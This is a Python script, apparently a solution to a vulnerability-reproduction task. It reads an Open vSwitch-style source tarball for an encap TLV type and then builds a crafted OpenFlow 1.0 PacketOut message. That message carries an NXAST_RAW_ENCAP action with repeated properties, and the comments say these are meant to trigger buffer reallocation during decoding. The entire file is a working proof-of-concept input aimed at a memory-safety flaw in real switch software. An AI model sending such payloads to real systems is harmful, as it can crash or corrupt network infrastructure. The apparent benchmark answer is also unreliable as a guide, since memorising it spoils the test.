import struct
import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Default property type if parsing fails (1 is commonly Ethernet or similar)
        prop_type = 1
        
        # Attempt to extract a valid NX_ENCAP_TLV_TYPE from the source code
        # to ensure decode_ed_prop succeeds and writes to the buffer.
        try:
            with tarfile.open(src_path, 'r') as tar:
                for member in tar:
                    if not (member.isfile() and (member.name.endswith('.h') or member.name.endswith('.c'))):
                        continue
                    
                    f = tar.extractfile(member)
                    if not f:
                        continue
                    
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        # Look for enum assignment or define
                        match = re.search(r'NX_ENCAP_TLV_TYPE_\w+\s*=\s*(\d+)', content)
                        if match:
                            prop_type = int(match.group(1))
                            break
                        
                        match = re.search(r'#define\s+NX_ENCAP_TLV_TYPE_\w+\s+(\d+)', content)
                        if match:
                            prop_type = int(match.group(1))
                            break
                    except Exception:
                        continue
        except Exception:
            pass

        # Construct payload: OpenFlow 1.0 PacketOut with NXAST_RAW_ENCAP action
        
        # Properties: Type-Length-Value
        # We add multiple properties to trigger ofpbuf reallocation during decoding.
        # Structure: Type (2 bytes), Length (2 bytes), Value (variable)
        # Length includes the 4-byte header.
        props = b''
        for _ in range(3):
            # Type=prop_type, Len=8 (4 header + 4 data), Data=0x00...
            props += struct.pack("!HH4s", prop_type, 8, b'\x00' * 4)

        # NXAST_RAW_ENCAP Action
        # Header: Type (2), Length (2), Vendor (4), Subtype (2), Pad (6)
        # Type: OFPAT_VENDOR (0xffff)
        # Vendor: NX_VENDOR_ID (0x00002320)
        # Subtype: NXAST_RAW_ENCAP (46)
        action_len = 16 + len(props)
        action_header = struct.pack("!HHLH6s", 0xffff, action_len, 0x00002320, 46, b'\x00'*6)
        action = action_header + props

        # PacketOut Body
        # Buffer ID (4): -1 (No buffer)
        # In Port (2): OFPP_CONTROLLER (0xfffd)
        # Actions Length (2)
        po_body = struct.pack("!LHH", 0xffffffff, 0xfffd, len(action))

        # OpenFlow Header
        # Version (1): OF 1.0
        # Type (13): OFPT_PACKET_OUT
        # Length (2): Total length
        # XID (4): 0
        msg_body = po_body + action
        of_header = struct.pack("!BBHL", 1, 13, 8 + len(msg_body), 0)

        return of_header + msg_body